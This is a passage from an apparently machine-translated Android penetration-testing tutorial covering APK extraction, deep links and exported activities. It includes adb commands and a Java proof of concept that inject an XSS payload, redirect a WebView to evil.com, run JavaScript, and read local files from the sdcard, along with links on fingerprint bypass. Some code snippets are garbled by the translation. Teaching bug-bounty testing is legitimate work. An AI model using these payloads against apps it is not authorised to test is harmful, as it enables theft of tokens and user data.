gy na lx l ly lz">if [[ -z $1 ]]; then<br/>    echo "Usage: $0 &lt;Name of APK&gt;"<br/>fi</span><span id="91e2" class="lu lv iq lp b gy na lx l ly lz">APK_PATH="$(adb shell pm path $1)"<br/>echo "${APK_PATH#*:}"<br/>APK_PATH=${APK_PATH#*:}<br/>adb pull $APK_PATH</span><span id="642b" class="lu lv iq lp b gy na lx l ly lz"># Make sure we successfully pulled down an APK before renaming it<br/>if [[ -f base.apk ]]; then<br/>    mv base.apk $1.apk<br/>fi</span><span id="1827" class="lu lv iq lp b gy na lx l ly lz"># Open in JADX-GUI if you specify<br/>if [[ "$2" == "--jadx" ]] || [[ "$2" == "-j" ]]; then<br/>    $(which jadx-gui) $1.apk<br/>fi</span></pre><p id="db36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">别名:</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="e5ff" class="lu lv iq lp b gy lw lx l ly lz">alias autoapk="bash $HOME/.android_sec_tools/autoapk.sh"</span></pre><p id="9df3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">示例用法(这将下拉<code class="fe lm ln lo lp b">chromium</code>的apk，然后用<code class="fe lm ln lo lp b">jadx-gui</code>打开它:</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="71f1" class="lu lv iq lp b gy lw lx l ly lz">autoapk org.chromium.chrome --jadx</span></pre><p id="ce7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">安卓深度链接</strong></p><p id="46a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个<a class="ae mw" href="https://developer.android.com/training/app-links/deep-linking" rel="noopener ugc nofollow" target="_blank">深度链接</a>是一个意图过滤器，允许用户直接在你的Android应用中输入一个特定的活动。点击其中一个链接可能会打开一个消歧对话框，允许用户选择多个应用程序(包括你的)中的一个来处理给定的URL。例如，图1显示了用户点击地图链接后的消歧对话框，询问是在Maps还是Chrome中打开链接。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/19fbb53bfccf8b4a9c8ed5486895da15.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*LDJJIvSR4F9dGy2Z.png"/></div></figure><p id="6e11" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">深层链接是用in意图过滤器声明的。</strong></p><p id="93b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下XML片段显示了如何在清单中为深度链接指定意图筛选器。URIs <code class="fe lm ln lo lp b">“example://gizmos”</code>和<code class="fe lm ln lo lp b">“http://www.example.com/gizmos”</code>都决心参加这个活动。</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="9a5d" class="lu lv iq lp b gy lw lx l ly lz">&lt;activity<br/>    android:name="com.example.android.GizmosActivity"<br/>    android:label="@string/title_gizmos" &gt;<br/>    &lt;intent-filter android:label="@string/filter_view_http_gizmos"&gt;<br/>        &lt;action android:name="android.intent.action.VIEW" /&gt;<br/>        &lt;category android:name="android.intent.category.DEFAULT" /&gt;<br/>        &lt;category android:name="android.intent.category.BROWSABLE" /&gt;<br/>        &lt;!-- Accepts URIs that begin with "http://www.example.com/gizmos” --&gt;<br/>        <strong class="lp ir">&lt;data android:scheme="http"<br/>              android:host="www.example.com"<br/>              android:pathPrefix="/gizmos" /&gt;</strong><br/>        &lt;!-- note that the leading "/" is required for pathPrefix--&gt;<br/>    &lt;/intent-filter&gt;<br/>    &lt;intent-filter android:label="@string/filter_view_example_gizmos"&gt;<br/>        &lt;action android:name="android.intent.action.VIEW" /&gt;<br/>        &lt;category android:name="android.intent.category.DEFAULT" /&gt;<br/>        &lt;category android:name="android.intent.category.BROWSABLE" /&gt;<br/>        &lt;!-- Accepts URIs that begin with "example://gizmos” --&gt;<br/>        &lt;<strong class="lp ir">data android:scheme="example"<br/>              android:host="gizmos" /&gt;</strong><br/>    &lt;/intent-filter&gt;<br/>&lt;/activity&gt;</span></pre><ul class=""><li id="ba45" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">在“AndroidManifest.xml”中搜索<strong class="jp ir"> android:exported="true" </strong>活动</li><li id="dfe8" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">在JADx-GUI中打开此活动→搜索"<strong class="jp ir"> SetJavascriptEnable </strong>"</li><li id="3c34" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">现在检查活动中的任何意图。</li><li id="5c58" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">对设备具有root权限(即# terminal)的用户可以调用任何活动，只需向所需的活动发送一个意向。例如:</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="b9ef" class="lu lv iq lp b gy lw lx l ly lz">$ adb shell am start -n &lt;package_name&gt;/&lt;activity_name&gt;</span></pre><ul class=""><li id="6587" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">但是作为非root用户，不能调用任何非导出的app组件。您可以使用上面的命令来利用导出的活动/服务/提供者/接收者</li></ul><h1 id="401b" class="nb lv iq bd ma nc nd ne md nf ng nh mg ni nj nk mj nl nm nn mm no np nq mp nr bi translated">测试导出的活动</h1><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="6a2b" class="lu lv iq lp b gy lw lx l ly lz">adb shell am start -n &lt;package&gt;/&lt;activity&gt; -e &lt;parameter&gt; "data_to_send"</span></pre><p id="4b13" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">-n</code>:提供包名和关联活动<br/> <code class="fe lm ln lo lp b">-e</code>:发送您的数据(和后续数据本身)的参数</p><p id="b02f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">示例:</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="646d" class="lu lv iq lp b gy lw lx l ly lz">adb shell am start -n b3nac.injuredandroid/b3nac.injuredandroid.FlagTwelveExportedActivity -e totally_secure "https://google.com"</span></pre><h1 id="be94" class="nb lv iq bd ma nc nd ne md nf ng nh mg ni nj nk mj nl nm nn mm no np nq mp nr bi translated">创建Java概念证明</h1><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="b5fc" class="lu lv iq lp b gy lw lx l ly lz">package target.package.poc;</span><span id="84d0" class="lu lv iq lp b gy na lx l ly lz">// Resolve these via Android Studio<br/>import ...</span><span id="fc6a" class="lu lv iq lp b gy na lx l ly lz">public class MainActivity extends AppCompatActivity {<br/>    @Override<br/>    protected void onCreate(Bundle savedInstanceState) {<br/>        super.onCreate(savedInstanceState);<br/>        setContentView(R.layout.activity_main);<br/>        <br/>        Intent intent = new Intent();<br/>        intent.setClassName("package.to.target", "package.to.target.TargetActivity");<br/>        intent.putExtra("parameter", "data_to_send_ie&lt;svg onload=prompt(1)&gt;");<br/>        startActivity(intent);<br/>    }<br/>}</span></pre><h1 id="62a1" class="nb lv iq bd ma nc nd ne md nf ng nh mg ni nj nk mj nl nm nn mm no np nq mp nr bi translated">测试你的深层链接</h1><p id="7eaf" class="pw-post-body-paragraph jn jo iq jp b jq mr js jt ju ms jw jx jy mt ka kb kc mu ke kf kg mv ki kj kk ij bi translated">您可以使用带有活动管理器(am)工具的<a class="ae mw" href="https://developer.android.com/tools/help/adb" rel="noopener ugc nofollow" target="_blank"> Android调试桥</a>来测试您为深度链接指定的意图过滤器URIs是否解析到正确的应用活动。您可以针对设备或模拟器运行adb命令。</p><p id="f355" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用adb测试意图过滤器URI的一般语法是:</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="9b32" class="lu lv iq lp b gy lw lx l ly lz">$ adb shell am start<br/>        -W -a android.intent.action.VIEW<br/>        -d &lt;URI&gt; &lt;PACKAGE&gt;</span></pre><p id="cb4a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">am</code> -活动管理器<br/></p><p id="925f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，下面的命令尝试查看与指定URI关联的目标应用程序活动。</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="e6ec" class="lu lv iq lp b gy lw lx l ly lz">$ adb shell am start<br/>        -W -a android.intent.action.VIEW<br/>        -d "example://gizmos" com.example.android</span></pre><ul class=""><li id="9f5f" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">我们怎么知道应该叫什么？</li></ul><p id="64ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为此，我们应该查看清单，并寻找活动声明，那些被定义为导出的或具有意图的声明甚至可以在非根设备上调用。</p><ul class=""><li id="afdf" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">在Android Manifest中搜索“<strong class="jp ir"> :// </strong>”，这将有助于找到自定义的深度链接。</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="9d07" class="lu lv iq lp b gy lw lx l ly lz">adb shell am start -n bounty.pay/.PartOneActivity -a android.intent.action.VIEW -d “one://part?start=PartTwoActivity”</span></pre><p id="9705" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">安卓多查询参数深度链接</strong></p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="6a1b" class="lu lv iq lp b gy lw lx l ly lz">adb shell am start -W -a android.intent.action.VIEW -d "myCustomScheme://myHost?key=category_parent_id\&amp;value=93\&amp;title=test" com.myApp.android</span></pre><p id="ddf4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">(注意，当使用多个查询参数时，我们需要在前面加一个“”</p><p id="a07d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">例如:</strong></p><p id="e232" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">片段#1</p><p id="e77e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">代码:</strong>→<strong class="jp ir">" intent . putextra(" EXTRA _ URL "，str)；"</strong></p><ul class=""><li id="4b87" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">在android中“putExtra(String name，str)”用于将扩展数据添加到意图中。它有两个参数，第一个指定了额外数据的名称，第二个参数是数据本身。</li></ul><p id="2e70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">片段#2</p><p id="1917" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">代码:</strong>→<strong class="jp ir">loadUrl(getintentent()。getstring EXTRA(" EXTRA _ URL ")；"</strong></p><ul class=""><li id="a89d" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">在这种情况下，getIntent()返回启动该活动的意图。如果你用一些数据开始一项活动。让我们把它变得非常简单和简短，<strong class="jp ir"> "intent.putExtra("EXTRA_URL "，str)；"</strong>的意思是，你可以把“EXTRA_URL”看成一个变量&amp;<strong class="jp ir">getStringExtra(" EXTRA_URL "))</strong>这里用来从“EXTRA _ URL”变量中获取数据或值。</li></ul><p id="978c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">概念验证重现OpenRedirect: </strong></p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="cd33" class="lu lv iq lp b gy lw lx l ly lz">am start -W -n app.company/.ui.events.web.WebViewActivity -a ACTION_OPEN_WEB -e EXTRA_URL <a class="ae mw" href="https://evil.com" rel="noopener ugc nofollow" target="_blank">https://evil.com</a></span></pre><p id="c8cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">重现Javascript注入:</strong></p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="a0cc" class="lu lv iq lp b gy lw lx l ly lz">am start -n app.company/.ui.events.web.WebViewActivity -a ACTION_OPEN_WEB -e EXTRA_URL "javascript://google.com%0A alert(lol);"</span></pre><p id="1937" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">复制本地文件窃取:</strong>该bug可以:</p><p id="f757" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">→在应用沙箱中显示令牌、授权、配置等</p><p id="bc7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">→在应用沙盒中显示用户数据</p><p id="f613" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">→如果允许，访问“/sdcard”数据</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="4510" class="lu lv iq lp b gy lw lx l ly lz">am start -n app.company/.ui.events.web.WebViewActivity -a ACTION_OPEN_WEB -e EXTRA_URL 'file:///sdcard/personal.txt'</span></pre><p id="1207" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">工具:<a class="ae mw" href="https://github.com/mzfr/slicer" rel="noopener ugc nofollow" target="_blank">https://github.com/mzfr/slicer</a></p><p id="6863" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">参考资料:</p><div class="nv nw gp gr nx ny"><a href="https://mobexler.com/checklist.htm" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">移动应用渗透测试平台</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">APK文件和信息收集获取APK文件和收集信息直接从客户端获取应用程序…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">mobexler.com</p></div></div></div></a></div><div class="nv nw gp gr nx ny"><a href="https://mazhuang.org/awesome-adb/README.en.html" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">太棒了-亚洲开发银行</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">Android调试桥(ADB)是包含在Android SDK包中的一个工具包，它不仅是一个强大的工具…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">mazhuang.org</p></div></div></div></a></div><div class="nv nw gp gr nx ny"><a href="https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/mobile.md" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">naham sec/初学者资源-Bug-赏金猎人</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">因为有相当多的人要求手机黑客入门指南，我们特别给了它一个章节…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">github.com</p></div></div><div class="oh l"><div class="or l oj ok ol oh om kv ny"/></div></div></a></div><div class="nv nw gp gr nx ny"><a href="https://github.com/randorisec/MobileHackingCheatSheet" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">randorisec/MobileHackingCheatSheet</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">移动黑客备忘单试图总结一些关于工具和命令的有趣的基本信息…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">github.com</p></div></div><div class="oh l"><div class="os l oj ok ol oh om kv ny"/></div></div></a></div><div class="nv nw gp gr nx ny"><a href="https://www.hackerone.com/blog/androidhackingmonth-intro-to-android-hacking" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated"># Android Hacking month:Android黑客入门，作者@0xteknogeek</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">当我第一次开始移动黑客时，感觉很像狂野的西部。公共资源很少，博客…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">www.hackerone.com</p></div></div><div class="oh l"><div class="ot l oj ok ol oh om kv ny"/></div></div></a></div><div class="nv nw gp gr nx ny"><a href="https://www.hackerone.com/blog/AndroidHackingMonth-qa-with-bagipro" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">#AndroidHackingMonth与Android黑客bagipro的问答</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">移动黑客已经成为bug赏金猎人工具带中必不可少的一部分，没有人比他更了解这个领域…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">www.hackerone.com</p></div></div><div class="oh l"><div class="ou l oj ok ol oh om kv ny"/></div></div></a></div><div class="nv nw gp gr nx ny"><a href="https://github.com/maverickNerd/Android-Reports-and-Resources" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">特立独行的书呆子/Android-报告和资源</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">一大串Android Hackerone披露的报告和其他资源。-特立独行的书呆子/Android-报告和资源</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">github.com</p></div></div><div class="oh l"><div class="ov l oj ok ol oh om kv ny"/></div></div></a></div><p id="8898" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">指纹旁路:</strong></p><div class="nv nw gp gr nx ny"><a href="https://noobsec.org/project/2019-12-22-bypass-fingerprint-lock-in-just-1-second/" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">只需1秒绕过指纹锁！</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">如果点击诱饵可以吸引更多的人，那么我可以告诉你不要被媒体干扰，但是网络可以……</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">noobsec.org</p></div></div><div class="oh l"><div class="ow l oj ok ol oh om kv ny"/></div></div></a></div><div class="nv nw gp gr nx ny"><a href="https://hackerone.com/reports/637194" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">HackerOne上披露的Shopify:绕过生物识别安全...</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">摘要Shopify Android应用程序有一个使用指纹登录应用程序的选项。但是如果应用程序是打开的并且…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">hackerone.com</p></div></div><div class="oh l"><div class="ox l oj ok ol oh om kv ny"/></div></div></a></div></div></div>    
</body>
</html>